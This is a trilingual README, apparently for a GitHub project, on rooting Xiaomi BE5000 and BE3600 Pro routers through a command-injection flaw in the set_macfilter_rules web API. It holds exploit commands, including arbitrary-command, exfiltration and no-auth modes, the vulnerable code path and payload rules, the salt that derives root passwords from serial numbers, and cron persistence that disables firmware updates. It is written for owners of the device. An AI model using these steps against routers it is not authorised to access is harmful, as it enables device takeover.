# Xiaomi BE5000 (RD18) — как включить Telnet

Для прошивки **1.0.91**. Подключите компьютер к сети своего роутера.

<a id="top"></a>
<a id="ru"></a>

**Язык / Language / 语言:** **Русский** · [English](#en) · [简体中文](#zh)

[♥ Поддержать проект через GitHub Sponsors](https://github.com/sponsors/pabragin)

## Windows — простой запуск

1. Установите [Python 3](https://www.python.org/downloads/windows/).
   Если установщик предлагает **Add python.exe to PATH**, включите эту опцию.
2. [Скачайте архив проекта](https://github.com/pabragin/xiaomi-rp01-root/archive/refs/heads/main.zip)
   и **распакуйте** его в папку.
3. Скачайте `putty.exe` с [официального сайта PuTTY](https://www.chiark.greenend.org.uk/~sgtatham/putty/latest.html)
   и положите рядом с `START_WINDOWS.bat`.
4. Дважды нажмите **`START_WINDOWS.bat`**.
5. Введите IP роутера (или нажмите Enter для `192.168.31.1`),
   **пароль его веб-интерфейса** и SN с наклейки. SN можно пропустить, если знаете root-пароль.
6. После успешной проверки порта откроется PuTTY. Войдите как **`root`**.
   Пароль программа покажет перед подключением; если вы его раньше меняли, используйте свой.

Первый запуск сам подготовит окружение Python и установит зависимость — нужен интернет.
При вводе паролей символы не отображаются. Если PuTTY не открылся, запустите его вручную:
**Host Name:** `192.168.31.1` (или ваш IP), **Connection type:** `Telnet`, **Port:** `23`, затем **Open**.

## macOS / Linux

Установите Python 3, скачайте и распакуйте тот же архив. Откройте терминал в папке
проекта и выполните:

```bash
python3 run.py
```

Ответьте на вопросы программы. Для подключения используйте PuTTY или команду
`telnet 192.168.31.1`, если клиент Telnet установлен.

## Что нужно знать

- **Бэкап разделов для запуска не нужен.** Ничего дополнительно настраивать не требуется.
- После перезагрузки доступ может пропасть — просто запустите программу ещё раз.
- Калькулятор пароля проверен исходным проектом на RP01; на RD18 результат зависит
  от использования того же алгоритма. Если пароль не подходит, нужен действующий root-пароль.
- Telnet передаёт данные открытым текстом. Используйте свою доверенную локальную сеть.
- Способ включения Telnet взят из [issue #9](https://github.com/perrywey/xiaomi-rp01-root/issues/9).
  Этот форк проверен локальными тестами; запуск на Windows и физическом RD18 автором форка не проверен.

<details>
<summary><strong>Подробности: ручной запуск, автозапуск после перезагрузки и резервные копии</strong></summary>

## Что исправлено в этом форке

По [сообщению пользователя в issue #9](https://github.com/perrywey/xiaomi-rp01-root/issues/9),
в прошивке BE5000 1.0.91 отсутствует `/usr/sbin/dropbear`, поэтому обычный запуск SSH
не работает. Этот форк включает Telnet, если Dropbear отсутствует. Можно также явно
выбрать Telnet параметром `--telnet`.

Вторая поправка касается резервных копий: приёмник проверяет размеры разделов по
`/proc/mtd` вашего роутера, а не по жёстко заданной таблице от RP01.

Локальные проверки кода пройдены. Автор этого форка не проверял работу на физическом
BE5000 и сохранение доступа после его перезагрузки. Первоначальный способ включения
Telnet взят из указанного отчёта пользователя.

## 1. Подготовка на компьютере

Нужны Python 3, Git и клиент Telnet. Подключите компьютер к локальной сети роутера.
Далее используется адрес `192.168.31.1`; если у вас другой, замените его в командах.

Скачайте форк и установите зависимость в отдельное окружение Python:

```bash
git clone https://github.com/pabragin/xiaomi-rp01-root.git
cd xiaomi-rp01-root
python3 -m venv .venv
source .venv/bin/activate
python3 -m pip install requests
```

Команды активации окружения здесь приведены для macOS и Linux.
Если оболочка пишет `telnet: command not found`, установите клиент Telnet для своей ОС.

Понадобится **пароль веб-интерфейса роутера** — тот, с которым вы входите в панель
управления. Это не обязательно пароль Wi-Fi и не пароль аккаунта Xiaomi.
Скрипты пока выводят часть сообщений на китайском; запрос пароля выглядит как
`请输入路由器 WEB 管理密码`.

## 2. Рассчитать пароль root

Найдите серийный номер **SN** на наклейке роутера. Подставьте свой номер вместо примера,
сохранив `/`, если он есть:

```bash
python3 tools/calc_root_pwd.py '12345/A1B2C3D4E5F6'
```

Скрипт выведет восьмизначный пароль в строке `密码`. Имя пользователя — `root`.
Калькулятор использует алгоритм, проверенный исходным проектом на RP01; он подходит
для устройств с тем же алгоритмом генерации пароля. Если root-пароль уже меняли,
используйте установленный пароль. Issue #9 не подтверждает отдельно проверку
калькулятора на RD18.

Не публикуйте свой SN и полученный пароль.

## 3. Включить Telnet

**На компьютере**, из папки проекта с активным окружением Python:

```bash
python3 tools/exploit_set_macfilter_rules.py --ip 192.168.31.1 --telnet
```

Когда скрипт запросит пароль, введите **пароль веб-интерфейса**.
Команда отправляет роутеру следующий набор действий:

```sh
echo 1 > /proc/xiaoqiang/ft_mode
nvram set telnet_en=1
nvram commit
telnetd
```

Они включают необходимые для Xiaomi флаги и запускают Telnet с обычным входом
по логину и паролю. Ответ API `{"code":0}` сам по себе не подтверждает запуск сервиса.
Проверка — успешное подключение на следующем шаге.

## 4. Подключиться к роутеру

**На компьютере:**

```bash
telnet 192.168.31.1
```

Введите логин `root` и root-пароль из шага 2 либо ранее установленный пароль.
При вводе пароля символы могут не отображаться — это нормально.

Telnet передаёт пароль и команды открытым текстом: используйте доверенную локальную
сеть и не открывайте порт 23 в интернет. Порт SSH 22 на этой прошивке останется
закрытым, если SSH-сервер не установлен.

## 5. Сохранить доступ после перезагрузки — по желанию

Без этого шага после перезагрузки может потребоваться снова выполнить шаг 3.
Следующий способ использует `/data` и cron. Он предполагает, что `/etc/crontabs`
на вашей прошивке хранится постоянно; на RD18 это ещё требуется проверить.

**Внутри Telnet-сессии на роутере** выполните:

```sh
mkdir -p /data/telnet /etc/crontabs
cat > /data/telnet/boot.sh <<'BOOTEOF'
#!/bin/sh
echo 1 > /proc/xiaoqiang/ft_mode
netstat -ltn 2>/dev/null | grep -q ':23 ' || telnetd
BOOTEOF
chmod 700 /data/telnet/boot.sh
nvram set telnet_en=1
nvram commit
grep -qF '/data/telnet/boot.sh' /etc/crontabs/root 2>/dev/null || echo '* * * * * /data/telnet/boot.sh' >> /etc/crontabs/root
chmod 600 /etc/crontabs/root
/etc/init.d/cron restart 2>/dev/null || /usr/sbin/crond -c /etc/crontabs -b
/data/telnet/boot.sh
```

Команды добавляют одну задачу cron, сохраняя существующие. Она раз в минуту проверяет
порт 23 и при необходимости запускает Telnet. После следующей перезагрузки подождите
около минуты и попробуйте подключиться. Если доступ не восстановился, повторите шаг 3.

## 6. Резервная копия разделов — необязательно для Telnet

Для включения Telnet бэкап не нужен. Он полезен перед прошивкой и другими изменениями,
при которых может потребоваться восстановление устройства. Этот раздел был
в исходном проекте; в форке исправлена проверка размеров для разных моделей.

У RD18 другая таблица разделов: в issue #9 указаны `mtd0`–`mtd13`.
Нельзя переносить номера разделов и расположение калибровочных данных с RP01.
Команды ниже читают фактический список из `/proc/mtd` и не записывают данные во flash.

**На компьютере** запустите приёмник в отдельном терминале из папки проекта:

```bash
python3 tools/recv_backup.py "$HOME/rd18_backup" 8001
```

Узнайте локальный IP компьютера. Убедитесь, что роутер может подключиться к нему
на порт 8001. Приёмник должен оставаться запущенным.

**В Telnet-сессии на роутере** посмотрите таблицу разделов и свободную память:

```sh
cat /proc/mtd
df -h /tmp
```

В `/tmp` должно хватать места одновременно на бинарную копию крупнейшего раздела
и её base64-представление — суммарно примерно 2,4 размера раздела.
Если памяти недостаточно, не запускайте этот способ копирования.

В следующем блоке замените `192.168.31.100` на **IP своего компьютера**, затем
выполните его **на роутере**:

```sh
PC_IP=192.168.31.100
wget -q --post-file=/proc/mtd -O /dev/null "http://$PC_IP:8001/proc-mtd.txt" &&
awk -F: '/^mtd[0-9]+:/ {print $1}' /proc/mtd | while read -r m; do
    dd if=/dev/mtdblock"${m#mtd}" of=/tmp/m.bin bs=65536 2>/dev/null &&
    base64 /tmp/m.bin > /tmp/m.b64 &&
    wget -q --post-file=/tmp/m.b64 -O /dev/null "http://$PC_IP:8001/$m.b64" || break
    rm -f /tmp/m.bin /tmp/m.b64
done
```

Сначала передаётся таблица разделов, затем сами разделы. Base64 нужен из-за
описанного в исходном проекте обрезания бинарных POST-запросов в BusyBox wget.
Приёмник сохраняет декодированные файлы `mtdN.bin` на компьютере.

Результаты в окне приёмника:

- `[MTD]` — таблица разделов принята.
- `[OK]` — размер полученного раздела совпадает с таблицей устройства.
- `[NG]` — размер не совпадает; такую копию нельзя считать полной.
- `[UNCHECKED]` — для раздела нет ожидаемого размера; проверка не выполнена.

Проверьте, что **каждый раздел из `/proc/mtd` получен и отмечен `[OK]`**.
Совпадение размера не является проверкой контрольной суммы. Сохраните копию каталога
`rd18_backup` на другом носителе; файлы могут содержать пароли и ключи устройства.

## Если подключение не работает

- **Не удаётся войти в веб-интерфейс через скрипт:** проверьте адрес роутера и пароль
  его панели управления. Для обычного использования параметр `--no-auth` не нужен.
- **Telnet сообщает `Connection refused`:** сервис не запущен. Повторите шаг 3
  и посмотрите сообщения скрипта. Успешный ответ API не гарантирует запуск Telnet.
- **Telnet подключается, но пароль не подходит:** нужен пароль пользователя `root`.
  Расчёт по SN не восстановит пароль, который ранее поменяли вручную.
- **SSH сообщает `Connection refused`:** в RD18 1.0.91 отсутствует Dropbear;
  используйте Telnet по этой инструкции.

## Проверки кода

**На компьютере**, в активном окружении Python:

```bash
python3 -m unittest discover -s tests -v
python3 tools/calc_root_pwd.py --selftest
```

Тесты проверяют выбор SSH/Telnet, разбор таблицы разделов и локальный HTTP-приём
резервных копий. Они не обращаются к роутеру и не проверяют работу на реальном RD18.

---

Ниже сохранены китайская и английская инструкции исходного проекта для
BE3600 Pro (RP01/RP02). Их команды запуска SSH и номера разделов относятся к этим
моделям. Для BE5000 используйте русскую инструкцию выше.


</details>

---

<a id="rd18"></a>

### Xiaomi BE5000 (RD18), firmware 1.0.91 / 固件 1.0.91

[Issue #9](https://github.com/perrywey/xiaomi-rp01-root/issues/9) reports successful
access on RD18 1.0.91, where `/usr/sbin/dropbear` is absent. This fork defaults to
SSH when Dropbear exists and otherwise enables Xiaomi's Telnet flags and starts
`telnetd`. To explicitly select Telnet:

[#9 社区报告](https://github.com/perrywey/xiaomi-rp01-root/issues/9)确认 RD18 1.0.91
没有 `/usr/sbin/dropbear`。本 fork 默认优先启动 SSH，缺少 Dropbear 时启用 Telnet；
也可显式选择 Telnet：

```bash
python3 tools/exploit_set_macfilter_rules.py --ip 192.168.31.1 --password YOUR_WEB_PASSWORD --telnet
telnet 192.168.31.1
```

Log in as `root` using your device's root password (see `calc_root_pwd.py`).
This uses the firmware's normal login, so it does not reset or bypass the password.
Telnet sends credentials and traffic in plaintext; use a trusted LAN.
Port 22 stays closed if no SSH server is installed.

使用 `root` 和设备的 root 密码登录（见 `calc_root_pwd.py`）；不会重置或绕过密码。
Telnet 明文传输密码和流量，请在可信 LAN 中使用。没有 SSH 服务时 22 端口仍关闭。

For persistence on RD18, run the following **inside the router shell** instead of
section 3.4's Dropbear script. It appends one cron entry and keeps existing jobs.
The issue reports the initial Telnet workaround; reboot persistence still needs
verification on your device, including the persistent `/etc/crontabs` mount.

RD18 持久化请在**路由器 shell** 中执行以下命令，替代 3.4 的 Dropbear 脚本；
保留现有 cron 任务。社区报告验证了首次 Telnet 访问；重启持久化仍需在本机确认，
包括 `/etc/crontabs` 的持久挂载。

```sh
mkdir -p /data/telnet /etc/crontabs
cat > /data/telnet/boot.sh <<'BOOTEOF'
#!/bin/sh
echo 1 > /proc/xiaoqiang/ft_mode
netstat -ltn 2>/dev/null | grep -q ':23 ' || telnetd
BOOTEOF
chmod 700 /data/telnet/boot.sh
nvram set telnet_en=1
nvram commit
grep -qF '/data/telnet/boot.sh' /etc/crontabs/root 2>/dev/null || echo '* * * * * /data/telnet/boot.sh' >> /etc/crontabs/root
chmod 600 /etc/crontabs/root
/etc/init.d/cron restart 2>/dev/null || /usr/sbin/crond -c /etc/crontabs -b
/data/telnet/boot.sh
```

RD18 has a different partition layout (reported as `mtd0`–`mtd13`). Use the dynamic
backup procedure in section 3.5: upload `/proc/mtd` **before** any partitions.
RP01's partition numbers and calibration locations do not apply to RD18.
The receiver checks decoded byte counts; `[UNCHECKED]` is not a verified backup.

RD18 分区布局不同（报告为 `mtd0`–`mtd13`）。请按 3.5 的动态流程，**先上传
`/proc/mtd`** 再备份分区。不要套用 RP01 分区编号或校准数据位置。
接收端校验解码后的字节数，`[UNCHECKED]` 不表示备份已通过验证。

---

<a id="zh"></a>

## 🇨🇳 简体中文

> **无需拆机 · 无需串口 · 无需降级 · 不依赖 xmir-patcher**
>
> 通过一个此前未被公开利用的命令注入漏洞 `api/xqsystem/set_macfilter_rules`，
> 在稳定版 1.0.67 上拿到完整 root shell。

---

### 目录

- [0. 适用性与风险](#0-适用性与风险)
- [1. 准备](#1-准备)
- [2. 三步速通](#2-三步速通给急性子)
- [3. 详细步骤](#3-详细步骤)
- [4. 原理](#4-原理这个漏洞到底是什么)
- [5. 排错：四个必踩的坑](#5-排错四个必踩的坑)
- [6. FAQ](#faq-zh)
- [7. 附录](#7-附录)

---

### 0. 适用性与风险

#### 已验证环境

| 设备 | 型号 | 固件 | 验证来源 |
|---|---|---|---|
| 小米 BE3600 Pro **网线版** | **RP01** | MiWiFi 稳定版 **1.0.67** | 作者本人（内核 `Linux 5.4.213 armv7l`，2026-09）|
| 小米 BE5000 | **RD18** | MiWiFi 稳定版 **1.0.91** | [社区报告 #9](https://github.com/perrywey/xiaomi-rp01-root/issues/9)，使用 Telnet |
| 小米 BE3600 Pro **8 口网线版** | **RP02** | MiWiFi 稳定版 **1.0.46** | 社区用户实测反馈，已完成 SSH 获取 |

RP01 和 RP02 都是稳定版、都是网线版系列，且固件版本不同（1.0.46 / 1.0.67）都成立，
说明这个接口在多个版本上一直存在，不是某个版本的特例。

**未验证但可能适用的**：BE3600 Pro 非网线版、BE6500 Pro 等其它新型号。
如果你测成功了，欢迎提 issue 告诉我型号 + 固件版本，我会补进这张表。

#### 为什么 xmir-patcher 在这台机器上没用

xmir-patcher 的四个入口在 1.0.67 上**全部失效**，原因各不相同：

| 入口 | 注入参数 | 为什么失败 |
|---|---|---|
| `arn_switch` | `level` | 不在 `hackCheck` 白名单 → 特殊字符被拦 |
| `start_binding` | `uid` / `key` | 不在白名单 → 被拦 |
| `set_mac_filter` | `name` | **带 `?commonstr` 正则检查**，拦 `` ` `` `;` `\|` `$` `&` 等 |
| datacenter / `connect6.py` | 多参数探测 | 无可用入口 |

**本教程用的是另一个接口 `set_macfilter_rules`**（注意和 `set_mac_filter` 不是一个东西），
它读 `name` 参数时**没有正则检查**，这是关键差异。

#### 其他机型能用吗

需要满足两点：

1. 固件里注册了 `api/xqsystem/set_macfilter_rules` 这个接口
2. 该接口读 `name` 时走的是 2 参数 `formvalue`（不带正则）

RP01/1.0.67 已确认满足。其他机型请自行解包固件确认，或直接跑本教程的
`--probe` 只读验证（安全，只发一个 ping）。

#### 使用前提与风险

> **前提：你必须是该设备的所有者。** 本教程的正常路径需要提供设备的 WEB 管理密码，
> 这本身就是一道授权门槛。唯一能绕过它的 `--no-auth` 参数，脚本会**强制要求你确认设备所有权**，
> 非交互环境下必须显式加 `--confirm-owner` 才允许运行。

- 仅适用于**你自己拥有**的设备
- 可能导致**失去官方保修**
- 操作不当有**变砖**风险（按本教程操作不会，但请务必先做 [3.5 备份 flash](#35-备份-flash强烈建议)）
- 作者不对任何设备损坏、数据丢失负责

**请勿对不属于你的设备使用。** 在中国大陆，未经授权侵入他人计算机信息系统可能触犯
《刑法》第 285 条；该条第三款对"提供专门用于侵入的工具"亦有规定。
本仓库只分发**分析方法与自己编写的脚本，不含任何小米固件二进制文件**，
且利用过程需要目标设备的管理密码 —— 这些是刻意保留的边界。

本仓库内容以技术研究与设备管理为目的发布。若你所在辖区对固件逆向有额外限制，请自行评估。

---

### 1. 准备

**硬件/网络**

- 电脑与路由器在**同一局域网**（路由器默认网关 `192.168.31.1`）
- 电脑需能 ping 通 `192.168.31.1`

**软件**

- Python 3（macOS / Linux 自带）
- 本仓库的 `tools/` 目录

```bash
git clone https://github.com/pabragin/xiaomi-rp01-root.git && cd xiaomi-rp01-root
```

**你需要知道两件事**

| 信息 | 哪里找 |
|---|---|
| **路由器 WEB 管理密码** | 你第一次配置路由器时设的密码（网页/米家里设的）。**不是** WiFi 密码，也**不是**小米账号密码 |
| **设备序列号 SN** | 路由器底部标签，形如 `12345/A1B2C3D4E5F6`（**斜杠是 SN 的一部分**）。也可以在拿到 shell 后用 `nvram get SN` 查 |

> 没有设过 WEB 密码？脚本会尝试空密码，通常也能过。

---

### 2. 三步速通（给急性子）

```bash
# ① 算 root 密码（把 SN 换成你自己的）
python3 tools/calc_root_pwd.py 12345/A1B2C3D4E5F6

# ② 利用漏洞开启 SSH（把密码换成你的 WEB 管理密码）
python3 tools/exploit_set_macfilter_rules.py --ip 192.168.31.1 --password 你的WEB密码

# ③ 登录（密码用 ① 算出来的 8 位）
ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa \
    -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
    root@192.168.31.1
```

成功会看到 `Welcome to XiaoQiang!` 的 BusyBox 横幅。

**强烈建议继续做 [3.4 持久化](#34-持久化重启后还能进来) 和 [3.5 备份 flash](#35-备份-flash强烈建议)。**

---

### 3. 详细步骤

#### 3.1 算 root 密码

小米在路由器首次开机时用 `mkxqimage -I` 生成 root 密码并写入 `/etc/shadow`，
算法是 `MD5(SN + 固定盐)` 的前 8 位。本地即可计算：

```bash
python3 tools/calc_root_pwd.py 12345/A1B2C3D4E5F6
```

输出：

```
SN      : 12345/A1B2C3D4E5F6
用户名  : root
密码    : xxxxxxxx
```

想确认算法可信？跑自测（与固件自带的 `mkxqimage` 在 qemu 中真实运行的输出比对）：

```bash
python3 tools/calc_root_pwd.py --selftest
```

> **仅用于找回你自己设备的 root 密码。** SN 可以直接推导出该设备的 root 密码，
> 所以**不要把 SN 或算出的密码分享给他人** —— 教程示例里的 SN 是虚构的占位符。

#### 3.2 利用漏洞开启 SSH

```bash
python3 tools/exploit_set_macfilter_rules.py --ip 192.168.31.1 --password 你的WEB密码
```

脚本在 Dropbear 存在时生成 hostkey 并启动 SSH；缺失时自动使用 [Telnet](#rd18)。SSH 分支：

```sh
mkdir -p /etc/dropbear
dropbearkey -t rsa -f /etc/dropbear/dropbear_rsa_host_key
/usr/sbin/dropbear -p 22
```

看到 `响应: {"code":0}` 就成了。验证：

```bash
nc -vz 192.168.31.1 22      # 应显示 succeeded
```

> **不确定漏洞在你机器上是否成立？先做只读验证**（只发一个 ping，不改动任何东西）：
> ```bash
> sudo tcpdump -i any icmp &          # 另开一个终端看包
> python3 tools/exploit_set_macfilter_rules.py --ip 192.168.31.1 --password 你的WEB密码 --probe
> ```
> 收到来自 `192.168.31.1` 的 ICMP 包即证明命令执行成功。

**其他用法**

| 命令 | 作用 |
|---|---|
| `--cmd 'id'` | 执行任意命令 |
| `--cmd 'uname -a' --exfil 192.168.31.100:8001` | 把命令输出回传到你的电脑 |
| `--no-auth` | 跳过登录直接打（会先要求你确认设备所有权） |

> `--no-auth` 绕过了"需要提供 WEB 密码"这个授权门槛，所以它**默认会停下来要你确认**
> 目标设备为你本人所有；在脚本/管道等非交互环境里，必须显式加 `--confirm-owner` 才会执行。
> 这是刻意加的护栏，请不要为了方便而去掉它。

#### 3.3 登录

```bash
ssh -o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa \
    -o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null \
    root@192.168.31.1
```

**那两个 `-o` 必须加** —— 路由器上的 dropbear 是 2017.75，只支持 SHA-1 的
`ssh-rsa` hostkey，而 OpenSSH 8.8+（macOS Monterey 之后自带）默认禁用它。
不加会报 `no matching host key type found`，看起来像被拒绝，其实是客户端不同意算法。

**省事配置**，加到 `~/.ssh/config`：

```
Host miwifi
    HostName 192.168.31.1
    User root
    HostKeyAlgorithms +ssh-rsa
    PubkeyAcceptedAlgorithms +ssh-rsa
    StrictHostKeyChecking no
    UserKnownHostsFile /dev/null
    LogLevel QUIET
```

之后只要 `ssh miwifi`。

#### 3.4 持久化（重启后还能进来）

> ✅ **持久化已由社区验证有效**：RP02 上实测"重启过一会就能再次进入 SSH"。
> 那个"过一会"正是 crontab 每分钟兜底触发的节奏（重启后最多等约 1 分钟）。
> 即使万一失效，你也可以重跑一次 3.2 恢复访问，不会被锁在外面。

**为什么需要它：** `/etc` 是内存文件系统，重启即丢。只有两个地方持久 ——
`nvram` 分区和 `/data`（ubifs）。而 `/etc/crontabs` 会被 bind-mount 到
`/data/etc/crontabs`，所以写 crontab 就能跨重启存活。

**在路由器 shell 里粘贴执行：**

```sh
mkdir -p /data/ssh /etc/dropbear
[ -s /data/ssh/host_key ] || cp /etc/dropbear/dropbear_rsa_host_key /data/ssh/host_key 2>/dev/null
[ -s /data/ssh/host_key ] || dropbearkey -t rsa -f /data/ssh/host_key
cp /data/ssh/host_key /etc/dropbear/dropbear_rsa_host_key
chmod 700 /etc/dropbear; chmod 600 /etc/dropbear/dropbear_rsa_host_key
cat > /data/ssh/boot.sh <<'BOOTEOF'
#!/bin/sh
mkdir -p /etc/dropbear
[ -s /etc/dropbear/dropbear_rsa_host_key ] || cp /data/ssh/host_key /etc/dropbear/dropbear_rsa_host_key
chmod 600 /etc/dropbear/dropbear_rsa_host_key
netstat -ltn 2>/dev/null | grep -q ':22 ' || /usr/sbin/dropbear -p 22
BOOTEOF
chmod 755 /data/ssh/boot.sh
mkdir -p /etc/crontabs
# ⚠️ 千万别用 echo '...' > /etc/crontabs/root 直接覆盖！
#    出厂 crontab 有 13 条任务（日志轮转、NTP 校时、温度保护等），覆盖后一并丢失。
#    下面是完整内容：保留出厂任务、去掉 OTA 预下载那行、末尾追加我们自己的。
cat > /etc/crontabs/root <<'CRONEOF'
*/5 * * * * command -v sp_check.sh >/dev/null && sp_check.sh
*/2 * * * * command -v logrotate >/dev/null && logrotate /etc/logrotate.conf
*/15 * * * * /usr/sbin/ntpsetclock 60 log >/dev/null 2>&1
* * * * * /usr/sbin/startscene_crontab.lua `/bin/date "+%u %H:%M"`
*/3 * * * * /usr/sbin/mobile_accel.sh check >/dev/null 2>&1
0 */6 * * * command -v sec_cfg_bak.sh >/dev/null && sec_cfg_bak.sh
* * * * * run-parts -a 1min /etc/periodic
*/5 * * * * run-parts -a 5min /etc/periodic
*/10 * * * * run-parts -a 10min /etc/periodic
3 * * * * run-parts -a hourly /etc/periodic
6 1 * * * run-parts -a daily /etc/periodic
*/30 * * * * /usr/sbin/cpu_temperature_protect.sh >/dev/null 2>&1
* * * * * /data/ssh/boot.sh
CRONEOF
chmod 600 /etc/crontabs/root
killall crond 2>/dev/null; sleep 1
/etc/init.d/cron restart 2>/dev/null || /usr/sbin/crond -c /etc/crontabs -b
nvram set ssh_en=1; nvram set telnet_en=1; nvram set uart_en=1; nvram commit
/data/ssh/boot.sh; sleep 1; netstat -ltn | grep ':22 '
```

最后应打印 `tcp 0 0 0.0.0.0:22 ... LISTEN`。

顺带把 hostkey 固化在 `/data/ssh/host_key`，以后重启 SSH 不会再报 host key 变更。

> **关于那份 crontab**：上面这份比出厂**少了一行** ——
> `1 3,4,5 * * * /usr/sbin/otapredownload`，那是小米每天凌晨 3/4/5 点的 OTA 预下载任务，
> 它内部的 `ota_upgrade()` 才是真正会拉新固件的通道（Web 后台的"自动升级"开关
> 改的只是 `otapred.settings.auto`）。去掉它可以避免某天夜里被静默升级，
> 详见 [FAQ](#q固件会自动升级吗root-会丢吗)。除了这一条，其余出厂任务都保留了。

#### 3.5 备份 flash（强烈建议）

这是你唯一的后悔药。**其中 `mtd16`（ART 无线校准）和 `mtd21`（bdata，含 SN/MAC/设备密钥）
一旦丢失，是任何官方固件都补不回来的** —— 没备份 = 刷砖即报废。

**电脑上运行接收端**（新开一个终端，别关）：

```bash
python3 tools/recv_backup.py ~/rp01_backup 8001
```

**路由器 shell 里：**

```sh
wget -q --post-file=/proc/mtd -O /dev/null http://你的电脑IP:8001/proc-mtd.txt &&
awk -F: '/^mtd[0-9]+:/ {print $1}' /proc/mtd | while read -r m; do
    dd if=/dev/mtdblock"${m#mtd}" of=/tmp/m.bin bs=65536 2>/dev/null &&
    base64 /tmp/m.bin > /tmp/m.b64 &&
    wget -q --post-file=/tmp/m.b64 -O /dev/null http://你的电脑IP:8001/"$m".b64 || break
    rm -f /tmp/m.bin /tmp/m.b64
done
```

（把 `你的电脑IP` 换成实际地址，如 `192.168.31.100`。）

电脑端会打印每个分区的大小和 `[OK]` / `[NG]` 校验结果，`/proc/mtd` 列出的每个分区都必须收到且为 `[OK]`。`[NG]` 表示大小不匹配，`[UNCHECKED]` 表示缺少对应的 `/proc/mtd` 数据。

**为什么先 base64？** 见 [坑 4](#坑-4备份出来的文件只有几十字节)。

备份完成后，**再复制一份到网盘或移动硬盘**。放在同一台电脑里，机器和电脑一起出事就没了。

---

### 4. 原理：这个漏洞到底是什么

#### 4.1 调用链

```
POST /cgi-bin/luci/;stok=<TOKEN>/api/xqsystem/set_macfilter_rules
     mac=<合法MAC>&name=<载荷>&option=0
  │
  ├─ 控制器读 name：formvalue("name")        ← 2 参数，无正则检查
  │     而旧接口 set_mac_filter 是 formvalue("name", nil, "?commonstr") ← 有正则
  │
  ├─ XQSecureUtil.hackCheck 本该过滤特殊字符，
  │     但 "name" 在它的白名单里 → 直接放行，一个字符都不查
  │
  ├─ XQFirewall.setMacFilter(mac, name, "0", "")
  │
  └─ os.execute("/usr/sbin/macfilter add black <mac> rulename=<载荷>")
        ↑ 无转义，以 root 执行
```

#### 4.2 关键代码（解包后的 Lua）

`XQFirewall.lua`，拼接命令处：

```lua
L11 = "/usr/sbin/macfilter " .. L7 .. " " .. L8 .. " " .. A0
if A1 then
    L11 = L11 .. " rulename=" .. A1      -- A1 就是 name，未做任何转义
end
os.execute(L11)
```

`XQSecureUtil.lua` 的 `hackCheck`，白名单里有 `name`：

```lua
local whitelist = { name = 1, password = 1, ssid = 1, ... }
if whitelist[key] then return true end      -- 白名单命中 → 直接放行
-- 否则检查禁用字符类 [ ` ; | $ & \n ]
```

#### 4.3 载荷规则（实测得出）

| 字符 | 能否用 | 原因 |
|---|---|---|
| 换行 | ✅ | 白名单放行，控制器不切割 |
| 反引号 `` ` `` | ✅ | 同上 |
| `$( )` | ✅ | 同上 |
| `\|` `&` | ✅ | 同上 |
| **分号 `;`** | ❌ | 控制器用 `;` 把 `mac`/`name` 切成列表按下标配对，`;` 后面的内容会丢 |

其他必要条件：

- `option` 必须是 `0`（=add）。`option=1`（del）且 MAC 不在表里时会提前 return，不执行。
- `mac` 必须匹配 `^[0-9a-fA-F:;]+$` 且**不在现有 macfilter 表里**（脚本每次随机生成新 MAC 规避）。

#### 4.4 root 密码是怎么来的

`etc/init.d/system`：

```sh
set_user(){
    local inited=$(uci -q get xiaoqiang.common.INITTED)
    [ "$inited" != "YES" ] && {
        local init_pwd=`mkxqimage -I`              # ← 密码在这里生成
        [ -n "$init_pwd" ] && {
            (echo $init_pwd; sleep 1; echo $init_pwd) | passwd root
        }
    }
}
```

出厂配置里没有 `INITTED` 键，所以首次开机必然执行，`/etc/shadow` 里的 root 密码
就是 `mkxqimage -I` 的输出。`mkxqimage` 读 `nvram get SN`，算法为
`MD5(SN + "6d2df50a-250f-4a30-a5e6-d44fb0960aa0")` 的前 8 位。

---

### 5. 排错：四个必踩的坑

#### 坑 1：telnetd 起不来（23 端口 refused）

小米给 busybox 的 `telnetd` **打了补丁**，启动时会读：

```
cat /proc/xiaoqiang/ft_mode
cat /usr/share/xiaoqiang/xiaoqiang_version | grep CHANNEL
bdata get telnet_en / nvram get telnet_en
```

稳定版（`CHANNEL=release`）下除非 `telnet_en=1` 或 `ft_mode=1`，否则**拒绝启动**。
闸在 busybox 二进制里，不在 `/etc/init.d/telnet` 脚本里 —— 所以改 init 脚本没用。

**解法：改用 dropbear**（`strings /usr/sbin/dropbear` 里没有这些检查，未打补丁）。

#### 坑 2：`dropbear -p 22 -R` 起不来

`/etc/dropbear/dropbear_rsa_host_key` 在固件里是个 **0 字节占位文件**，
而 `-R`（自动生成 hostkey）遇到已存在的文件**不会覆盖**，于是拿空 key 启动失败。

**解法：先删再显式生成**

```sh
rm -f /etc/dropbear/dropbear_rsa_host_key
dropbearkey -t rsa -f /etc/dropbear/dropbear_rsa_host_key
/usr/sbin/dropbear -p 22
```

#### 坑 3：SSH 握手失败

```
Unable to negotiate with 192.168.31.1 port 22: no matching host key type found. Their offer: ssh-rsa
```

dropbear 2017.75 只有 SHA-1 的 `ssh-rsa`，OpenSSH 8.8+ 默认禁用。

**解法：** 加 `-o HostKeyAlgorithms=+ssh-rsa -o PubkeyAcceptedAlgorithms=+ssh-rsa`。

#### 坑 4：备份出来的文件只有几十字节

busybox 的 `wget --post-file` **走 C 字符串，遇到 `0x00` 就截断**。
二进制分区第一个 NUL 处就被切掉，传出来全是残的。

最阴的是：恰好不含 NUL 的分区会**完整通过**，制造出"通路正常、只是个别分区有问题"的假象。
我就是靠核对分区大小表才发现的。

**解法：先 base64 再传**

```sh
base64 /tmp/m.bin > /tmp/m.b64     # 全 ASCII，无 NUL
```

校验也很简单：`512KB → 4×ceil(524288/3)=699,052` 字符 + `9,199` 个换行 = `708,251` 字节，
对得上就是完整的。

---

<a id="faq-zh"></a>

### 6. FAQ

**Q：路由器会从米家消失吗？**

不会。消失是因为把 `CHANNEL` 从 `release` 改成 `debug`（小米检测到开发版就踢出米家）。
本教程**完全不碰 CHANNEL**。而且这个机型 `/` 是只读 squashfs、`/usr` 上没有 overlay，
那个文件**想改也改不了**。

**Q：固件会自动升级吗？root 会丢吗？**

小米有两条升级通道，光关 Web 后台的"自动升级"**不够彻底**：

| 通道 | 机制 | 状态 |
|---|---|---|
